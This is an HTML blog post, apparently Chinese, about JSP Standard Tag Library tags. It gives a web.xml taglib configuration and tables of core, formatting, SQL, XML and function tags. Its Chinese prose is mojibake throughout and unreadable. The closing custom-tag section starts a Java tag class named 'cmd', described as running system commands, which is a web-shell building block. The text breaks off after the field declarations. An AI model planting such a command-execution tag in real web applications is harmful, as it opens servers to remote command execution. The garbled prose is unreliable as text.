<h5 id="JSTLæ ‡ç­¾">- JSTLæ ‡ç­¾ -</h5>
<p>å³ <code>jsp</code> æ ‡å‡†æ ‡ç­¾åº“ï¼Œå°è£…äº† <code>jsp</code> åº”ç”¨çš„é€šç”¨æ ¸å¿ƒåŠŸèƒ½ã€‚éœ€è¦ä» <a target="_blank" rel="noopener" href="http://archive.apache.org/dist/jakarta/taglibs/standard/binaries/">http://archive.apache.org/dist/jakarta/taglibs/standard/binaries/</a> ä¸‹è½½ç›¸åº”çš„ç‰ˆæœ¬ï¼Œç„¶åå°†é‡Œé¢ <code>lib</code> ç›®å½•çš„ <code>jar</code> ï¼Œ<code>tld</code> ç›®å½•çš„ <code>tld</code> æ–‡ä»¶æ”¾åˆ°å¯¹åº”è·¯å¾„ä¸­ã€‚</p>
<p>æ¯”å¦‚è¿™é‡Œè·¯å¾„é…ç½®å¦‚ä¸‹ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231928229.png" alt="image-20220223192855152"></p>
<p>ç„¶åæ˜¯ <code>web.xml</code> å†…å®¹ğŸ‘‡</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">taglib</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-uri</span>&gt;</span>http://java.sun.com/jsp/jstl/core<span class="tag">&lt;/<span class="name">taglib-uri</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-location</span>&gt;</span>/WEB-INF/tld/c.tld<span class="tag">&lt;/<span class="name">taglib-location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">taglib</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-uri</span>&gt;</span>http://java.sun.com/jsp/jstl/fmt<span class="tag">&lt;/<span class="name">taglib-uri</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-location</span>&gt;</span>/WEB-INF/tld/fmt.tld<span class="tag">&lt;/<span class="name">taglib-location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">taglib</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-uri</span>&gt;</span>http://java.sun.com/jsp/jstl/sql<span class="tag">&lt;/<span class="name">taglib-uri</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-location</span>&gt;</span>/WEB-INF/tld/sql.tld<span class="tag">&lt;/<span class="name">taglib-location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">taglib</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-uri</span>&gt;</span>http://java.sun.com/jsp/jstl/xml<span class="tag">&lt;/<span class="name">taglib-uri</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-location</span>&gt;</span>/WEB-INF/tld/x.tld<span class="tag">&lt;/<span class="name">taglib-location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">taglib</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-uri</span>&gt;</span>http://java.sun.com/jsp/jstl/functions<span class="tag">&lt;/<span class="name">taglib-uri</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-location</span>&gt;</span>/WEB-INF/tld/fn.tld<span class="tag">&lt;/<span class="name">taglib-location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp-config</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ ¹æ®æ‰€æä¾›çš„åŠŸèƒ½ï¼Œå¯ä»¥åˆ†ä¸º <code>5</code> ä¸ªç±»åˆ«ğŸ‘‡</p>
<ul>
<li><code>æ ¸å¿ƒæ ‡ç­¾</code></li>
<li><code>æ ¼å¼åŒ–æ ‡ç­¾</code></li>
<li><code>SQLæ ‡ç­¾</code></li>
<li><code>XMLæ ‡ç­¾</code></li>
<li><code>JSTLå‡½æ•°</code></li>
</ul>
<p>å…¶ä¸­å„ä¸ªæ ‡ç­¾å®šä¹‰å¦‚ä¸‹(æ‘˜è‡ª<a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jsp-jstl.html">jspæ ‡å‡†æ ‡ç­¾åº“</a>)ğŸ‘‡</p>
<p><code>æ ¸å¿ƒæ ‡ç­¾</code></p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">æ ‡ç­¾</th>
<th style="text-align:left">æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-out-tag.html">&lt;c:out&gt;</a></td>
<td style="text-align:left">ç”¨äºåœ¨JSPä¸­æ˜¾ç¤ºæ•°æ®ï¼Œå°±åƒ&lt;%= â€¦ &gt;</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-set-tag.html">&lt;c:set&gt;</a></td>
<td style="text-align:left">ç”¨äºä¿å­˜æ•°æ®</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-remove-tag.html">&lt;c:remove&gt;</a></td>
<td style="text-align:left">ç”¨äºåˆ é™¤æ•°æ®</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-catch-tag.html">&lt;c:catch&gt;</a></td>
<td style="text-align:left">ç”¨æ¥å¤„ç†äº§ç”Ÿé”™è¯¯çš„å¼‚å¸¸çŠ¶å†µï¼Œå¹¶ä¸”å°†é”™è¯¯ä¿¡æ¯å‚¨å­˜èµ·æ¥</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-if-tag.html">&lt;c:if&gt;</a></td>
<td style="text-align:left">ä¸æˆ‘ä»¬åœ¨ä¸€èˆ¬ç¨‹åºä¸­ç”¨çš„ifä¸€æ ·</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-choose-tag.html">&lt;c:choose&gt;</a></td>
<td style="text-align:left">æœ¬èº«åªå½“åš&lt;c:when&gt;å’Œ&lt;c:otherwise&gt;çš„çˆ¶æ ‡ç­¾</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-choose-tag.html">&lt;c:when&gt;</a></td>
<td style="text-align:left">&lt;c:choose&gt;çš„å­æ ‡ç­¾ï¼Œç”¨æ¥åˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-choose-tag.html">&lt;c:otherwise&gt;</a></td>
<td style="text-align:left">&lt;c:choose&gt;çš„å­æ ‡ç­¾ï¼Œæ¥åœ¨&lt;c:when&gt;æ ‡ç­¾åï¼Œå½“&lt;c:when&gt;æ ‡ç­¾åˆ¤æ–­ä¸ºfalseæ—¶è¢«æ‰§è¡Œ</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-import-tag.html">&lt;c:import&gt;</a></td>
<td style="text-align:left">æ£€ç´¢ä¸€ä¸ªç»å¯¹æˆ–ç›¸å¯¹ URLï¼Œç„¶åå°†å…¶å†…å®¹æš´éœ²ç»™é¡µé¢</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-foreach-tag.html">&lt;c:forEach&gt;</a></td>
<td style="text-align:left">åŸºç¡€è¿­ä»£æ ‡ç­¾ï¼Œæ¥å—å¤šç§é›†åˆç±»å‹</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-foreach-tag.html">&lt;c:forTokens&gt;</a></td>
<td style="text-align:left">æ ¹æ®æŒ‡å®šçš„åˆ†éš”ç¬¦æ¥åˆ†éš”å†…å®¹å¹¶è¿­ä»£è¾“å‡º</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-param-tag.html">&lt;c:param&gt;</a></td>
<td style="text-align:left">ç”¨æ¥ç»™åŒ…å«æˆ–é‡å®šå‘çš„é¡µé¢ä¼ é€’å‚æ•°</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-redirect-tag.html">&lt;c:redirect&gt;</a></td>
<td style="text-align:left">é‡å®šå‘è‡³ä¸€ä¸ªæ–°çš„URL.</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-url-tag.html">&lt;c:url&gt;</a></td>
<td style="text-align:left">ä½¿ç”¨å¯é€‰çš„æŸ¥è¯¢å‚æ•°æ¥åˆ›é€ ä¸€ä¸ªURL</td>
</tr>
</tbody>
</table>
<p><code>æ ¼å¼åŒ–æ ‡ç­¾</code></p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;fmt&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/fmt&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">æ ‡ç­¾</th>
<th style="text-align:left">æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-formatnumber-tag.html"><a href="fmt:formatNumber">fmt:formatNumber</a></a></td>
<td style="text-align:left">ä½¿ç”¨æŒ‡å®šçš„æ ¼å¼æˆ–ç²¾åº¦æ ¼å¼åŒ–æ•°å­—</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-parsenumber-tag.html"><a href="fmt:parseNumber">fmt:parseNumber</a></a></td>
<td style="text-align:left">è§£æä¸€ä¸ªä»£è¡¨ç€æ•°å­—ï¼Œè´§å¸æˆ–ç™¾åˆ†æ¯”çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-formatdate-tag.html"><a href="fmt:formatDate">fmt:formatDate</a></a></td>
<td style="text-align:left">ä½¿ç”¨æŒ‡å®šçš„é£æ ¼æˆ–æ¨¡å¼æ ¼å¼åŒ–æ—¥æœŸå’Œæ—¶é—´</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-parsedate-tag.html"><a href="fmt:parseDate">fmt:parseDate</a></a></td>
<td style="text-align:left">è§£æä¸€ä¸ªä»£è¡¨ç€æ—¥æœŸæˆ–æ—¶é—´çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-bundle-tag.html"><a href="fmt:bundle">fmt:bundle</a></a></td>
<td style="text-align:left">ç»‘å®šèµ„æº</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-setlocale-tag.html"><a href="fmt:setLocale">fmt:setLocale</a></a></td>
<td style="text-align:left">æŒ‡å®šåœ°åŒº</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-setbundle-tag.html"><a href="fmt:setBundle">fmt:setBundle</a></a></td>
<td style="text-align:left">ç»‘å®šèµ„æº</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-timezone-tag.html"><a href="fmt:timeZone">fmt:timeZone</a></a></td>
<td style="text-align:left">æŒ‡å®šæ—¶åŒº</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-settimezone-tag.html"><a href="fmt:setTimeZone">fmt:setTimeZone</a></a></td>
<td style="text-align:left">æŒ‡å®šæ—¶åŒº</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-message-tag.html"><a href="fmt:message">fmt:message</a></a></td>
<td style="text-align:left">æ˜¾ç¤ºèµ„æºé…ç½®æ–‡ä»¶ä¿¡æ¯</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-requestencoding-tag.html"><a href="fmt:requestEncoding">fmt:requestEncoding</a></a></td>
<td style="text-align:left">è®¾ç½®requestçš„å­—ç¬¦ç¼–ç </td>
</tr>
</tbody>
</table>
<p><code>SQLæ ‡ç­¾</code></p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;sql&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/sql&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">æ ‡ç­¾</th>
<th style="text-align:left">æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-sql-setdatasource-tag.html"><a href="sql:setDataSource">sql:setDataSource</a></a></td>
<td style="text-align:left">æŒ‡å®šæ•°æ®æº</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-sql-query-tag.html"><a href="sql:query">sql:query</a></a></td>
<td style="text-align:left">è¿è¡ŒSQLæŸ¥è¯¢è¯­å¥</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-sql-update-tag.html"><a href="sql:update">sql:update</a></a></td>
<td style="text-align:left">è¿è¡ŒSQLæ›´æ–°è¯­å¥</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-sql-param-tag.html"><a href="sql:param">sql:param</a></a></td>
<td style="text-align:left">å°†SQLè¯­å¥ä¸­çš„å‚æ•°è®¾ä¸ºæŒ‡å®šå€¼</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-sql-dateparam-tag.html"><a href="sql:dateParam">sql:dateParam</a></a></td>
<td style="text-align:left">å°†SQLè¯­å¥ä¸­çš„æ—¥æœŸå‚æ•°è®¾ä¸ºæŒ‡å®šçš„java.util.Date å¯¹è±¡å€¼</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-sql-transaction-tag.html"><a href="sql:transaction">sql:transaction</a></a></td>
<td style="text-align:left">åœ¨å…±äº«æ•°æ®åº“è¿æ¥ä¸­æä¾›åµŒå¥—çš„æ•°æ®åº“è¡Œä¸ºå…ƒç´ ï¼Œå°†æ‰€æœ‰è¯­å¥ä»¥ä¸€ä¸ªäº‹åŠ¡çš„å½¢å¼æ¥è¿è¡Œ</td>
</tr>
</tbody>
</table>
<p><code>XMLæ ‡ç­¾</code></p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;x&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/xml&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">æ ‡ç­¾</th>
<th style="text-align:left">æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-out-tag.html">&lt;x:out&gt;</a></td>
<td style="text-align:left">ä¸&lt;%= â€¦ &gt;,ç±»ä¼¼ï¼Œä¸è¿‡åªç”¨äºXPathè¡¨è¾¾å¼</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-parse-tag.html">&lt;x:parse&gt;</a></td>
<td style="text-align:left">è§£æ XML æ•°æ®</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-set-tag.html">&lt;x:set&gt;</a></td>
<td style="text-align:left">è®¾ç½®XPathè¡¨è¾¾å¼</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-if-tag.html">&lt;x:if&gt;</a></td>
<td style="text-align:left">åˆ¤æ–­XPathè¡¨è¾¾å¼ï¼Œè‹¥ä¸ºçœŸï¼Œåˆ™æ‰§è¡Œæœ¬ä½“ä¸­çš„å†…å®¹ï¼Œå¦åˆ™è·³è¿‡æœ¬ä½“</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-foreach-tag.html">&lt;x:forEach&gt;</a></td>
<td style="text-align:left">è¿­ä»£XMLæ–‡æ¡£ä¸­çš„èŠ‚ç‚¹</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-choose-tag.html">&lt;x:choose&gt;</a></td>
<td style="text-align:left">&lt;x:when&gt;å’Œ&lt;x:otherwise&gt;çš„çˆ¶æ ‡ç­¾</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-choose-tag.html">&lt;x:when&gt;</a></td>
<td style="text-align:left">&lt;x:choose&gt;çš„å­æ ‡ç­¾ï¼Œç”¨æ¥è¿›è¡Œæ¡ä»¶åˆ¤æ–­</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-choose-tag.html">&lt;x:otherwise&gt;</a></td>
<td style="text-align:left">&lt;x:choose&gt;çš„å­æ ‡ç­¾ï¼Œå½“&lt;x:when&gt;åˆ¤æ–­ä¸ºfalseæ—¶è¢«æ‰§è¡Œ</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-transform-tag.html">&lt;x:transform&gt;</a></td>
<td style="text-align:left">å°†XSLè½¬æ¢åº”ç”¨åœ¨XMLæ–‡æ¡£ä¸­</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-param-tag.html">&lt;x:param&gt;</a></td>
<td style="text-align:left">ä¸&lt;x:transform&gt;å…±åŒä½¿ç”¨ï¼Œç”¨äºè®¾ç½®XSLæ ·å¼è¡¨</td>
</tr>
</tbody>
</table>
<p><code>JSTLå‡½æ•°</code></p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;fn&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/functions&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">å‡½æ•°</th>
<th style="text-align:left">æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-contains.html">fn:contains()</a></td>
<td style="text-align:left">æµ‹è¯•è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«æŒ‡å®šçš„å­ä¸²</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-containsignoreCase.html">fn:containsIgnoreCase()</a></td>
<td style="text-align:left">æµ‹è¯•è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«æŒ‡å®šçš„å­ä¸²ï¼Œå¤§å°å†™ä¸æ•æ„Ÿ</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-endswith.html">fn:endsWith()</a></td>
<td style="text-align:left">æµ‹è¯•è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯å¦ä»¥æŒ‡å®šçš„åç¼€ç»“å°¾</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-escapexml.html">fn:escapeXml()</a></td>
<td style="text-align:left">è·³è¿‡å¯ä»¥ä½œä¸ºXMLæ ‡è®°çš„å­—ç¬¦</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-indexof.html">fn:indexOf()</a></td>
<td style="text-align:left">è¿”å›æŒ‡å®šå­—ç¬¦ä¸²åœ¨è¾“å…¥å­—ç¬¦ä¸²ä¸­å‡ºç°çš„ä½ç½®</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-join.html">fn:join()</a></td>
<td style="text-align:left">å°†æ•°ç»„ä¸­çš„å…ƒç´ åˆæˆä¸€ä¸ªå­—ç¬¦ä¸²ç„¶åè¾“å‡º</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-length.html">fn:length()</a></td>
<td style="text-align:left">è¿”å›å­—ç¬¦ä¸²é•¿åº¦</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-replace.html">fn:replace()</a></td>
<td style="text-align:left">å°†è¾“å…¥å­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„ä½ç½®æ›¿æ¢ä¸ºæŒ‡å®šçš„å­—ç¬¦ä¸²ç„¶åè¿”å›</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-split.html">fn:split()</a></td>
<td style="text-align:left">å°†å­—ç¬¦ä¸²ç”¨æŒ‡å®šçš„åˆ†éš”ç¬¦åˆ†éš”ç„¶åç»„æˆä¸€ä¸ªå­å­—ç¬¦ä¸²æ•°ç»„å¹¶è¿”å›</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-startswith.html">fn:startsWith()</a></td>
<td style="text-align:left">æµ‹è¯•è¾“å…¥å­—ç¬¦ä¸²æ˜¯å¦ä»¥æŒ‡å®šçš„å‰ç¼€å¼€å§‹</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-substring.html">fn:substring()</a></td>
<td style="text-align:left">è¿”å›å­—ç¬¦ä¸²çš„å­é›†</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-substringafter.html">fn:substringAfter()</a></td>
<td style="text-align:left">è¿”å›å­—ç¬¦ä¸²åœ¨æŒ‡å®šå­ä¸²ä¹‹åçš„å­é›†</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-substringbefore.html">fn:substringBefore()</a></td>
<td style="text-align:left">è¿”å›å­—ç¬¦ä¸²åœ¨æŒ‡å®šå­ä¸²ä¹‹å‰çš„å­é›†</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-tolowercase.html">fn:toLowerCase()</a></td>
<td style="text-align:left">å°†å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦è½¬ä¸ºå°å†™</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-touppercase.html">fn:toUpperCase()</a></td>
<td style="text-align:left">å°†å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦è½¬ä¸ºå¤§å†™</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-trim.html">fn:trim()</a></td>
<td style="text-align:left">ç§»é™¤é¦–ä½çš„ç©ºç™½ç¬¦</td>
</tr>
</tbody>
</table>
<h5 id="è‡ªå®šä¹‰æ ‡ç­¾">- è‡ªå®šä¹‰æ ‡ç­¾ -</h5>
<p>æ¯”æ–¹è¯´è‡ªå®šä¹‰ä¸€ä¸ªå¯ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ ‡ç­¾ <code>cmd</code> ï¼Œå…ˆå†™ä¸€ä¸ªå®ç°çš„ç±»ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.jsp.JspException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.jsp.tagext.SimpleTagSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cmd</span> <span class="keyword">extends</span> <span class="title">SimpleTagSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String cmd = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> show = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringWriter sw = <span class="keyword">new</span> StringWriter();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span 